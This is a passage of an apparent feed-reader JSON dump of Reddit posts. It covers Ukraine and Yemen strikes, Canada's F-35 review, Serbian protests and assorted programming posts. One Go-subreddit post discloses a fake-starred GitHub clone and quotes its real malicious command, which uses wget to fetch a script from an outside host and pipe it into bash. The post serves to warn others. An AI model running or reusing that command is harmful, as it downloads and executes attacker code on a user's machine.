Vadot","url":"https://www.reddit.com/r/europe/comments/1jc5q0p/european_defence_by_nicolas_vadot/","date":1742074268,"author":"/u/PjeterPannos","guid":396,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Once Again, Ukrainian Drones Are Blowing Up Russian Drone Factories","url":"https://www.forbes.com/sites/davidaxe/2025/03/15/once-again-ukrainian-drones-are-blowing-up-russian-drone-factories/","date":1742073289,"author":"/u/AndroidOne1","guid":391,"unread":true,"content":"<figure role=\"presentation\"><figcaption><p>A drone strike on a Russian drone factory in  April 2024.</p></figcaption></figure><p>Drones blowing up drone factories is now an established trend in a war increasingly dominated by unmanned aerial vehicles of all shapes and sizes.</p><p>On or just before March 13, long-range attack drones belonging to the Ukrainian defense intelligence agency struck a hidden drone manufacturing facility in Obukhovo, just outside Moscow 300 miles from the border with Ukraine.</p><p>The facility was concealed in a concrete plant. “Local residents were the first to report powerful explosions and a fire at the facility,” the Estonian analyst WarTranslated <a href=\"https://x.com/wartranslated/status/1900131591654977784\" rel=\"nofollow noopener noreferrer\" target=\"_blank\" title=\"https://x.com/wartranslated/status/1900131591654977784\" data-ga-track=\"ExternalLink:https://x.com/wartranslated/status/1900131591654977784\" aria-label=\"observed\">observed</a>.</p><p>It’s not the first time Ukrainian drones have targeted Russian drone factories. In April, Ukraine sortied one of its then-new Aeroprakt A-22 sport plane drones to <a href=\"https://www.forbes.com/sites/davidaxe/2024/04/02/ukraine-packed-a-cessna-style-plane-with-explosives-added-remote-controls-and-kamikazed-it-into-a-russian-drone-factory-600-miles-away/\" target=\"_self\" title=\"https://www.forbes.com/sites/davidaxe/2024/04/02/ukraine-packed-a-cessna-style-plane-with-explosives-added-remote-controls-and-kamikazed-it-into-a-russian-drone-factory-600-miles-away/\" data-ga-track=\"InternalLink:https://www.forbes.com/sites/davidaxe/2024/04/02/ukraine-packed-a-cessna-style-plane-with-explosives-added-remote-controls-and-kamikazed-it-into-a-russian-drone-factory-600-miles-away/\" aria-label=\"strike a drone plant\">strike a drone plant</a> in Yelabuga, 550 miles east of Moscow.</p><p>The 2024 raid remains one of the deepest in Ukraine’s escalating campaign of deep strikes on Russian targets, And it may have been the first in which the Ukrainian drones went after the industry supporting Russia’s own drones.</p><p>It makes sense for the Ukrainians to continue striking Russian drone factories. Ukraine’s edge in drone warfare is perhaps its most important advantage as Russia’s wider war on Ukraine grinds into its 37th month.</p><p>Ukrainian drones are so thick in the sky in many of the most important sectors that any Russian vehicles that leave their dugouts “operate in a one-way manner,” one Russian blogger <a href=\"https://www.forbes.com/sites/davidaxe/2025/03/07/russian-vehicles-operate-in-a-one-way-manner-as-ukrainian-drones-swarm-the-battlefield/\" target=\"_self\" title=\"https://www.forbes.com/sites/davidaxe/2025/03/07/russian-vehicles-operate-in-a-one-way-manner-as-ukrainian-drones-swarm-the-battlefield/\" data-ga-track=\"InternalLink:https://www.forbes.com/sites/davidaxe/2025/03/07/russian-vehicles-operate-in-a-one-way-manner-as-ukrainian-drones-swarm-the-battlefield/\" aria-label=\"complained\">complained</a>.</p><p>Struggling to jam the well-made Ukrainian drones, the Russians are trying to at least match the explosive UAVs vehicle-for-vehicle—if not exceed them on a technological level.</p><p>Elite Russian drone groups were the first in Ukraine to deploy unjammable fiber-optic drones that send and receive signals via miles-long cables instead of via radio datalinks, which are vulnerable to Ukrainian electronic warfare.</p><p>And now the Kremlin is ramping up production of the most numerous first-person-view drones in order to keep pace with Ukrainian production. The Kremlin has announced it will acquire as many as 4 million FPV drones this year; the defense ministry in Kyiv <a href=\"https://www.forbes.com/sites/davidaxe/2025/03/12/45-million-drones-is-a-lot-of-drones-its-ukraines-new-production-target-for-2025/\" target=\"_self\" title=\"https://www.forbes.com/sites/davidaxe/2025/03/12/45-million-drones-is-a-lot-of-drones-its-ukraines-new-production-target-for-2025/\" data-ga-track=\"InternalLink:https://www.forbes.com/sites/davidaxe/2025/03/12/45-million-drones-is-a-lot-of-drones-its-ukraines-new-production-target-for-2025/\" aria-label=\"is hoping to acquire\">is hoping to acquire</a> 4.5 million. The gap is closing.</p><p>In blowing up the drone factories, ironically with drones, the Ukrainian intelligence agency hopes to throttle Russian production—and ensure that most of the tiny UAVs buzzing over the front line ... are Ukrainian.</p>","contentLength":2411,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc5dgm/once_again_ukrainian_drones_are_blowing_up/"},{"title":"best way to integrate argocd and hashicorp vault","url":"https://www.reddit.com/r/kubernetes/comments/1jc4ise/best_way_to_integrate_argocd_and_hashicorp_vault/","date":1742070950,"author":"/u/Existing-Mirror2315","guid":372,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Existing-Mirror2315\"> /u/Existing-Mirror2315 </a>","contentLength":42,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"TracePerf: TypeScript-Powered Node.js Logger That Actually Shows You What's Happening","url":"https://github.com/thelastbackspace/traceperf","date":1742070828,"author":"/u/shubhwadekar","guid":406,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jc4h7d/traceperf_typescriptpowered_nodejs_logger_that/"},{"title":"Carney orders review of F-35 fighter jet purchase from U.S.’s Lockheed Martin","url":"https://www.ctvnews.ca/politics/article/carney-orders-review-of-f-35-fighter-jet-purchase-from-uss-lockheed-martin/","date":1742069954,"author":"/u/Old_General_6741","guid":750,"unread":true,"content":"<p>Updated:&nbsp;<time datetime=\"2025-03-15T19:38:32.556Z\">March 15, 2025 at 3:38PM EDT</time></p><p>Published:&nbsp;<time datetime=\"2025-03-15T16:56:06.375Z\">March 15, 2025 at 12:56PM EDT</time></p>","contentLength":79,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc45o4/carney_orders_review_of_f35_fighter_jet_purchase/"},{"title":"I implemented my own regex engine in Go","url":"https://github.com/bogdan-deac/regex","date":1742069910,"author":"/u/Constant_Apple_577","guid":363,"unread":true,"content":"<p>Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.</p>","contentLength":203,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc455b/i_implemented_my_own_regex_engine_in_go/"},{"title":"A Simple Linux Desktop for People with Cognitive Decline – Where to Start?","url":"https://www.reddit.com/r/linux/comments/1jc3mfs/a_simple_linux_desktop_for_people_with_cognitive/","date":1742068545,"author":"/u/Important-Ad2632","guid":380,"unread":true,"content":"<p>I have this idea that might be a bit far-fetched, and even though I’ve used Linux for years, I’m not really sure where to start.</p><p>The Background My dad was diagnosed with dementia over a year ago. While he’s still able to think clearly in many ways, his ability to use technology has taken a hit. He only got into computers and smartphones later in life, and now, with so much of society relying on digital tools—whether it’s banking, doctor appointments, or even just staying in touch—he’s struggling.</p><p>Where I live, we even have a government-issued two-factor authentication device/app that’s required for almost everything. It’s frustrating for him, and I’ve seen firsthand how technology, which should be making life easier, is actually making him feel more isolated. And let’s be real—this reliance on tech is only going to increase.</p><p>The Idea I’d love to create an ultra-simple Linux desktop tailored for people like my dad. Something that: • Boots straight into a locked-down, minimal desktop. • Has only a few essential programs, like a web browser, email client, or video calling app. • Allows relatives to configure everything through an admin panel setting bookmarks, fixing icons, and keeping things simple. • Runs on familiar hardware, since Linux makes it easy to install on existing devices with a USB.</p><p>This would be a passion project. I just see a real need for it, and I’m sure it could help a lot of people.</p><p>My Question I’m not planning on touching kernel code or diving into low-level OS development. I have some programming experience (mostly in data engineering and data science), but I don’t even know where to start researching a project like this. What tools or frameworks should I look into? Are there existing Linux distros or desktop environments that could be adapted for this purpose?</p><p>I know this won’t be ready in time to help my dad, but I’d still love to explore the idea. Any pointers would be appreciated!</p><p>Even if I drop the project along the way I still get to learn something new about Linux </p>","contentLength":2062,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The numbers","url":"https://www.reddit.com/r/europe/comments/1jc3ivs/the_numbers/","date":1742068275,"author":"/u/JexFr","guid":403,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"France's Macron to host Canada's Carney in Paris on Monday","url":"https://www.reuters.com/world/europe/frances-macron-host-canadas-carney-paris-monday-2025-03-15/","date":1742065591,"author":"/u/Advanced_Drink_8536","guid":388,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc2ixn/frances_macron_to_host_canadas_carney_in_paris_on/"},{"title":"On Trump's order, US launches large-scale attacks on Iran-backed Houthis","url":"https://www.jpost.com/breaking-news/article-846181","date":1742065053,"author":"/u/barsik_","guid":389,"unread":true,"content":"<p>The United States struck <a href=\"https://www.jpost.com/tags/houthi\">Houthi targets</a> in <a href=\"https://www.jpost.com/tags/yemen\">Yemen</a> on Saturday evening in a message to Iran, at a time when the administration is proposing to open negotiations on its nuclear program, a US official told </p><p>The strikes will last \"days, possible weeks\" an official told Reuters.</p><p>The Houthi-run health ministry reported that the US strikes have killed over 23 people and wounded more than 20 others in Yemen on Saturday.</p><p>An Israeli official told  that the US informed Israel in advance of the attacks on Yemen.&nbsp;</p><p>The air and naval strikes hit the Houthis’ radars, air defenses, and missile and drone systems,  reported.</p><p>The Houthi TV channel said that an electrical installation in the city of Dahyan, in the Saada province in northwestern Yemen, was also struck resulting in a loss of electricity across the city.</p><figure><figcaption> Smoke rises from the site of Israeli air strikes at the port of Hodeidah, in Hodeidah, Yemen July 21, 2024. (credit: REUTERS/STRINGER)</figcaption></figure><p>US President Donald Trump wrote on his Truth Social account that “today, I have ordered the United States military to launch decisive and powerful military action against the Houthi terrorists in Yemen. They have waged an unrelenting campaign of piracy, violence, and terrorism against American, and other, ships, aircraft, and drones.”Trump also slammed his predecessor, former president Joe Biden, for his “pathetically weak” handling of the Houthi threat.</p><p>“Funded by Iran, the Houthi thugs have fired missiles at US aircraft, and targeted our troops and allies. These relentless assaults have cost the US and world economy many billions of dollars while, at the same time, putting innocent lives at risk,” the president stressed.</p><section><section><div><div><p>Stay updated with the latest news!</p><p>Subscribe to The Jerusalem Post Newsletter</p></div></div></section></section><p>“The Houthi attack on American vessels will not be tolerated,” Trump wrote. “We will use overwhelming lethal force until we have achieved our objective. The Houthis have choked off shipping in one of the most important waterways of the world, grinding vast swaths of global commerce to a halt, and attacking the core principle of freedom of navigation upon which international trade and commerce depends.”</p><h3><strong>Donald Trump: Houthis, your time is up, starting today</strong></h3><p>The president concluded the post with a message to the Houthis and to Iran.</p><p>“To all Houthi terrorists, YOUR TIME IS UP, AND YOUR ATTACKS MUST STOP, STARTING TODAY. IF THEY DON’T, HELL WILL RAIN DOWN UPON YOU LIKE NOTHING YOU HAVE EVER SEEN BEFORE!” he wrote. “To Iran: Support for the Houthi terrorists must end IMMEDIATELY! Do NOT threaten the American people, their president, who has received one of the largest mandates in presidential history, or worldwide shipping lanes. If you do, BEWARE, because America will hold you fully accountable and, we won’t be nice about it!”</p><p>The strike’s goal is to open international shipping lanes in the Red Sea, which have been disrupted by the Houthis.Houthi-run Al Masirah TV previously said on Saturday that an attack targeted the Yemeni capital Sana’a, without providing further details.</p><p>The Iran-backed Houthi terror group paused attacks on Israel, which it began in support of Hamas, during the Israel-Hamas ceasefire. However, the Houthis announced last week that they would recommence attacks in response to Israel’s blockade on aid in Gaza.</p><p><em>This is a developing story.</em></p><p><em>Amichai Stein contributed to this report.</em></p>","contentLength":3398,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc2bf3/on_trumps_order_us_launches_largescale_attacks_on/"},{"title":"Breathtaking video: 800.000+ people are on the streets of Belgrade (Serbia) - protest against corruption","url":"https://v.redd.it/899b61dp5woe1","date":1742064901,"author":"/u/MrUncleBro","guid":567,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/europe/comments/1jc29fk/breathtaking_video_800000_people_are_on_the/"},{"title":"Pro European Demonstrations in Romania","url":"https://www.reddit.com/r/europe/comments/1jc25my/pro_european_demonstrations_in_romania/","date":1742064614,"author":"/u/mirceabyd","guid":398,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"The Glow of Freedom – Protests in Belgrade, Serbia 15.3.2025.","url":"https://www.reddit.com/r/europe/comments/1jc1e1b/the_glow_of_freedom_protests_in_belgrade_serbia/","date":1742062551,"author":"/u/Flashy-Diamond9613","guid":395,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape","url":"https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;utm_campaign=post&amp;utm_medium=web&amp;showWelcomeOnShare=true","date":1742061490,"author":"/u/theothertomelliott","guid":364,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc0zby/my_6_months_with_the_goth_stack_building/"},{"title":"Prime Minister Carney orders review of F-35 fighter jet purchase from U.S.’s Lockheed Martin","url":"https://montreal.citynews.ca/2025/03/15/carney-orders-review-of-f-35-fighter-jet-purchase-from-u-s-s-lockheed-martin/","date":1742059810,"author":"/u/BonkMcSlapchop","guid":392,"unread":true,"content":"<p>Prime Minister Mark Carney has asked for a review of Canada’s plan to purchase a fleet of F-35 fighter jets.</p><p>The deal with Lockheed Martin and the U.S. government is for 88 planes at a cost of about US$85 million each.</p><p>A spokesperson for Defence Minister Bill Blair said Carney has asked Blair to look into whether the F-35 contract is the best investment for Canada given the “changing environment,” or if there are better options.</p><p>“At this time, the contract to purchase the F-35 remains in place, and Canada has made a legal commitment of funds for the first 16 aircraft,” Laurent de Casanove said in a statement to CityNews. “The Prime Minister has also asked the Minister of National Defence to work with CAF/DND to determine if the F-35 contract, as it stands, is the best investment for Canada, and if there are other options that could better meet Canada’s needs.”</p><p>“To be clear, we are not cancelling the F-35 contract.” </p><p>Carney became prime minister on Friday, in the midst of a trade war with the United States and threats by U.S. President Donald Trump to annex Canada.&nbsp;</p><p>The new fleet is set to replace the Royal Canadian Air Force’s aging CF-18s, with the first four of the 88 planes expected to be delivered in 2026 and the final 18 in 2032.&nbsp;</p><p>In an interview with the CBC Friday, Blair said he will be looking at whether all the jets need to be F-35s, or whether there are other alternatives, “particularly where there may be opportunities” to assemble, support and maintain the jets in Canada.</p><p>“The direction I’ve been given by the prime minister is go and look at all of our options to make sure that we make the right decision for Canada,” he said.</p><p>Blair said he will consult with the Canadian Air Force, the chief of the defence staff, and the Department of National Defence, as well as allies and partners “to see what is possible.”</p><p>A spokesperson for Lockheed Martin referred questions to the Canadian and U.S. governments.&nbsp;</p><p>“Lockheed Martin values our strong partnership and history with the Royal Canadian Air Force and looks forward to continuing that partnership into the future,” the company said in a statement.</p><p>The White House did not respond to a request for comment Saturday afternoon.</p><h2>On-again, off-again decision to buy F-35s</h2><p>The Conservative government first committed to buying 65 F-35s without a competition in 2010, but concerns about the cost and capabilities forced it to reconsider.</p><p>Then, in 2015, the Liberals promised to instead launch an open competition to replace the CF-18s and not to buy the F-35 at all.</p><p>The government planned to buy 18 Super Hornets without a competition as an “interim” measure but cancelled the plan after Boeing launched a trade dispute with Montreal aerospace firm Bombardier.</p><p>Ottawa initiated an open bidding process for the new fleet in July 2019.</p><p>In January 2023, Canada announced it would buy the F-35 fighter jet with the first four of the 88 planes expected to be delivered in 2026 and the final 18 in 2032.</p><p>At the time, Defence Minister Anita Anand called the F-35 the best choice for Canada.</p><h2>A mixed fleet of planes ‘less disruptive, but costly and complex’</h2><p>Michael Byers, a professor at the University of British Columbia and co-director of the Outer Space Institute, has previously argued that Canada should cancel the contract because the planes are highly computerized, with Lockheed Martin refusing to share the full source code, and Canada would never be able to have full control of them.</p><p>He said Saturday the 16 planes that Canada has already paid for are sunk costs, and the country should “cut its losses.”</p><p>“We need planes that can operate to their full capacity without U.S.-controlled computer systems,” he said.</p><p>Philippe Lagassé, a Carleton University associate professor specializing in defence policy and procurement, said there is currently a “large scale transition underway” from the CF-18s to the F-35s, which doesn’t only include the planes, but also the also the “infrastructure, training, munitions, and operational constructs for North America.”</p><p>Lagassé, who also served as a member of the independent review panel that looked at the options to replace the CF-18s, said changing all those plans would be a massive undertaking.</p><p>“It can all be done, but it will put significant pressure on the RCAF and leave Canada with less capability for some time,” he said.</p><p>Opting for a mixed fleet of F-35s and another plane “would be less disruptive, but costly and complex.”</p><p>The Parliamentary Budget Officer has said the total cost to buy, fly and maintain the new F-35 fleet would be an estimated $73.9 billion. A 2023 report estimated the acquisition phase would cost $19.8 billion, including $10.7 billion for 88 planes, $2.1 billion for weapons and ammunition and $5.9 billion for elements like design and depot costs, infrastructure and training.</p>","contentLength":4889,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jc0co6/prime_minister_carney_orders_review_of_f35/"},{"title":"Thinking like a Staff Engineer at Big Tech with Sean Goedecke","url":"https://newsletter.techworld-with-milan.com/p/thinking-like-a-staff-engineer-at","date":1742059014,"author":"/u/milanm08","guid":718,"unread":true,"content":"<p>Here’s a glimpse of what we cover:</p><ul><li><p><strong>Key lessons in shipping large-scale projects and why keeping leadership informed matters</strong></p></li><li><p><strong>Balancing top-notch technical skills with selective soft-skill usage</strong></p></li><li><p><strong>Strategies for standing out in high-stakes company initiatives</strong></p></li><li><p><strong>The trade-offs behind key architectural decisions in SaaS development</strong></p></li><li><p><strong>Navigating career growth and promotions in remote or distributed teams</strong></p></li></ul><p>If you aim for a more significant impact in your engineering career, you’ll find much to explore in this conversation. </p><p><em><a href=\"https://www.semasoftware.com/\" rel=\"\">Sema</a></em></p><p><em>We’ve taken everything we’ve learned to build a SaaS product to help Engineering leaders.</em></p><p><em>Specifically, there are three modules ready in the MVP:</em></p><ul><li><p><em>to explain the level of tech debt to less technical audiences</em></p></li><li><p><em>to understand if the product roadmap is on track (with minimal setup!)</em></p></li><li><p><em>to manage GenAI coding usage to team-preferred levels</em></p></li></ul><p><em><strong>offering a $50 e-gift card for 15 minutes of feedback on the product.</strong></em></p><p>I’m a software engineer at GitHub, working on various AI products. I’ve been in the industry for about ten years, almost entirely at sizeable American tech companies doing what I would call standard SaaS web development. I don’t have a traditional computer science background. I have a degree in mathematics and an MA in moral philosophy, which set me up pretty well for the kind of careful, rigorous thinking you need to do in this business.</p><p><strong>Over five years, I worked my way up to a staff engineer role, then changed jobs to GitHub</strong></p><p>I live in Australia, but my manager and half my team are based in America, so I have a work environment spread across time zones (and cultures!), which can be pretty interesting. And a personal fact: I have two greyhounds, Daisy and Ringo, who I love wholeheartedly.</p><p><strong>being very intentional about your goals</strong><strong>figure out what gets people promoted to staff+ at your company</strong></p><p><strong>work on projects that were important to the company</strong></p><p><strong>I’m good at getting projects over the line</strong></p><p><strong>everything feels like a giant mess, and almost nobody understands end-to-end what’s going on.</strong></p><p><strong>There are many ways to be a successful staff engineer</strong><strong>The most important technical skill is fitting lots of context in your head (cognitive load)</strong></p><p><strong>If you’re leading the project</strong><strong>it’s your job to grasp the big picture</strong></p><p><strong>very comfortable with relational databases, have a good intuitive understanding of HTTP and whatever server architecture your main app is using</strong><strong>and enough frontend to be able to fix bugs and build new UI</strong></p><p><strong>being very selective about what battles I pick</strong></p><p>Other critical soft skills:</p><ul><li><p><strong>Writing short updates and work summaries</strong></p></li><li><p><strong>Bridging the gap between technical and non-technical communicators</strong></p></li><li><p><strong>Reassuring people who are panicking about the state of the project</strong></p></li></ul><p><strong>Soft skills are more critical at the staff level than other levels, but I don’t think they’re more vital than technical skills.</strong></p><p><strong>. When your skip-level manager changes, you have to start building that relationship up all over again</strong></p><p><strong>taking full advantage of your skip-level 1:1s in this situation.</strong></p><p><strong>towering internal confidence that they can dig in and work out when faced with a tricky problem</strong></p><p><strong>I read the official company goal</strong><strong>many engineers don’t even do that.</strong><em>What’s top-of-mind for you right now?</em></p><p><strong>I also try to pay attention to the vibes</strong></p><p><strong>I try not to have too many of my own goals in a high-priority project.</strong></p><p><strong>how metrics will lie to you, why understanding the system end-to-end is critical to understanding the problem, and so on.</strong></p><p><strong> that how your code runs in production is your responsibility as an engineer.</strong><a href=\"https://github.com/milanm/DevOps-Roadmap\" rel=\"\">DevOps movement</a></p><p><strong>I still try to understand the system end-to-end, pack as much context into my head as possible, and then pick the most pragmatic solution.</strong></p><p><a href=\"https://newsletter.techworld-with-milan.com/p/my-learnings-from-the-book-a-philosophy\" rel=\"\">keeping interfaces as small as possible</a><strong>I was much more emotionally invested in how systems were built</strong></p><p><strong>distributed systems and databases</strong><strong>large, out-of-sync distributed systems</strong></p><p><strong>Because I/O with the database is almost always the bottleneck for SaaS web dev</strong></p><p><strong>what successfully delivering a project means</strong></p><p><strong>many engineers focus on the “technically strong” part and neglect everything else</strong></p><p><strong>people will (understandably) assume that you’ve covered all the details,</strong><strong>even when you try to communicate otherwise,</strong></p><blockquote><p><em>The only way on earth to influence other people is to talk about what they want and show them how to get it</em></p></blockquote><p><strong>You should work on projects with more junior engineers, and as part of that, you should naturally involve them in your decisions and help them make their own choices</strong></p><p>I’ve seen many junior engineers I’ve worked with grow into strong senior engineers, so it doesn’t seem like I’m holding them back.</p><p><a href=\"https://news.ycombinator.com/\" rel=\"\">—Hacker News</a><a href=\"https://lobste.rs/\" rel=\"\">Lobsters,</a><strong>I make a deliberate effort to do is read the paper behind the article</strong></p><p><strong>writing blogs and code myself is excellent for learning</strong><a href=\"https://github.com/karpathy/nanoGPT\" rel=\"\">Karpathy’s nanogpt</a></p><blockquote><p><em>Learn more about the computer science papers every software engineer should read:</em></p></blockquote><div data-attrs=\"{&quot;id&quot;:153808414,&quot;url&quot;:&quot;https://newsletter.techworld-with-milan.com/p/computer-science-papers-every-developer&quot;,&quot;publication_id&quot;:1219834,&quot;publication_name&quot;:&quot;Tech World With Milan Newsletter&quot;,&quot;publication_logo_url&quot;:&quot;https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fafd6c17b-1bdf-4b80-a7cc-bd216bbe8edb_653x653.png&quot;,&quot;title&quot;:&quot;Computer Science Papers Every Developer Should Read&quot;,&quot;truncated_body_text&quot;:&quot;The foundations of modern software engineering were built on some high-impact research papers. From the algorithms powering most apps today to the databases storing data, many technologies we use daily emerged from academic publications. While these papers might initially seem complex, they offer important insights that can transform your approach to so…&quot;,&quot;date&quot;:&quot;2025-01-16T16:00:38.759Z&quot;,&quot;like_count&quot;:129,&quot;comment_count&quot;:9,&quot;bylines&quot;:[{&quot;id&quot;:24455408,&quot;name&quot;:&quot;Dr Milan Milanović&quot;,&quot;handle&quot;:&quot;techworldwithmilan&quot;,&quot;previous_name&quot;:&quot;Dr. Milan Milanović&quot;,&quot;photo_url&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3a792453-001b-4564-9b05-3f2323b46763_1280x1124.png&quot;,&quot;bio&quot;:&quot;I'm a CTO writing for a 350k+ community to share my experiences and explore my curiosity. I have more than 20 years of industry experience and a strong scientific background (Ph.D. in Computer Sciences).&quot;,&quot;profile_set_up_at&quot;:&quot;2022-11-30T13:30:12.729Z&quot;,&quot;publicationUsers&quot;:[{&quot;id&quot;:1175459,&quot;user_id&quot;:24455408,&quot;publication_id&quot;:1219834,&quot;role&quot;:&quot;admin&quot;,&quot;public&quot;:true,&quot;is_primary&quot;:false,&quot;publication&quot;:{&quot;id&quot;:1219834,&quot;name&quot;:&quot;Tech World With Milan Newsletter&quot;,&quot;subdomain&quot;:&quot;techworldwithmilan&quot;,&quot;custom_domain&quot;:&quot;newsletter.techworld-with-milan.com&quot;,&quot;custom_domain_optional&quot;:false,&quot;hero_text&quot;:&quot;Insights into a beautiful world of Software Engineering, simplified. \\n\\nJoin his community of 350,000+ readers across different mediums.&quot;,&quot;logo_url&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/afd6c17b-1bdf-4b80-a7cc-bd216bbe8edb_653x653.png&quot;,&quot;author_id&quot;:24455408,&quot;theme_var_background_pop&quot;:&quot;#D10000&quot;,&quot;created_at&quot;:&quot;2022-11-30T20:12:15.007Z&quot;,&quot;email_from_name&quot;:&quot;Dr Milan Milanovic from Tech World With Milan&quot;,&quot;copyright&quot;:&quot;Dr Milan Milanović&quot;,&quot;founding_plan_name&quot;:null,&quot;community_enabled&quot;:true,&quot;invite_only&quot;:false,&quot;payments_state&quot;:&quot;disabled&quot;,&quot;language&quot;:null,&quot;explicit&quot;:false,&quot;is_personal_mode&quot;:false}}],&quot;twitter_screen_name&quot;:&quot;milan_milanovic&quot;,&quot;is_guest&quot;:false,&quot;bestseller_tier&quot;:null}],&quot;utm_campaign&quot;:null,&quot;belowTheFold&quot;:true,&quot;type&quot;:&quot;newsletter&quot;,&quot;language&quot;:&quot;en&quot;}\" data-component-name=\"EmbeddedPostToDOM\"><a native=\"true\" href=\"https://newsletter.techworld-with-milan.com/p/computer-science-papers-every-developer?utm_source=substack&amp;utm_campaign=post_embed&amp;utm_medium=web\" rel=\"\"><div><div>Computer Science Papers Every Developer Should Read</div></div><div>The foundations of modern software engineering were built on some high-impact research papers. From the algorithms powering most apps today to the databases storing data, many technologies we use daily emerged from academic publications. While these papers might initially seem complex, they offer important insights that can transform your approach to so…</div><div>2 months ago · 129 likes · 9 comments · Dr Milan Milanović</div></a></div><p><a href=\"https://www.seangoedecke.com/how-i-use-llms/\" rel=\"\">building around LLM APIs</a></p><p><strong>more than 350,000+ tech professionals</strong></p><ol><li><p><a href=\"https://newsletter.techworld-with-milan.com/p/coaching-services\" rel=\"\">Book a working session with me</a></p></li></ol>","contentLength":5351,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jc01n4/thinking_like_a_staff_engineer_at_big_tech_with/"},{"title":"Zelenskyy: Partners agree that Ukraine and Europe can be strengthened in 3 years","url":"https://www.pravda.com.ua/eng/news/2025/03/15/7503060/","date":1742058753,"author":"/u/eaglemaxie","guid":386,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/worldnews/comments/1jbzy15/zelenskyy_partners_agree_that_ukraine_and_europe/"},{"title":"Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.","url":"https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/","date":1742058511,"author":"/u/_a8m_","guid":366,"unread":true,"content":"<p>Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.</p><pre><code>wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash &amp; </code></pre><p>I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project.</p><p> It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"After filling up the square in front of the Serbian parliament, protesters have now filled up the Slavija square also","url":"https://www.reddit.com/r/europe/comments/1jbzfgj/after_filling_up_the_square_in_front_of_the/","date":1742057426,"author":"/u/Landrayi","guid":400,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A glimpse of the largest protest in Serbian history happening right now in Belgrade.","url":"https://www.reddit.com/r/europe/comments/1jbyw2u/a_glimpse_of_the_largest_protest_in_serbian/","date":1742055995,"author":"/u/vuxeee","guid":404,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Testing PostMarketOS On MS Surface GO 2","url":"https://lemmy.ca/post/40708674","date":1742055927,"author":"/u/giannidunk","guid":379,"unread":true,"content":"<div>Testing Generic x86 edge PostMarketOS with gnome on my MS Surface GO. It's the best linux experience I have had on it. I want to test plasma mobile next.</div>","contentLength":153,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jbyv46/testing_postmarketos_on_ms_surface_go_2/"},{"title":"call for testing: rust-analyzer!","url":"https://www.reddit.com/r/rust/comments/1jbyunp/call_for_testing_rustanalyzer/","date":1742055893,"author":"/u/thramp","guid":376,"unread":true,"content":"<p>Hi folks! We've landed two big changes in rust-analyzer this past week: - A <a href=\"https://github.com/rust-lang/rust-analyzer/pull/18964\">Salsa upgrade</a>. Today, this should  improve performance, but in the near future, the new Salsa will allow us do features like parallel autocomplete and persistent caches. This work also unblocks us from using the Rust compiler's new trait solver! - Salsa-ification of the <a href=\"https://github.com/rust-lang/rust-analyzer/pull/19337\">crate graph</a>, which changed the unit of incrementality to an individual crate from the entire crate graph. This finer-grained incrementality means that actions that'd previously invalidate the entire crate graph (such as adding/removing a dependency or editing a build script/proc macro) will now cause rust-analyzer to  reindex the changed crate(s),  the entire workspace.</p><p>While we're pretty darn confident in these changes, 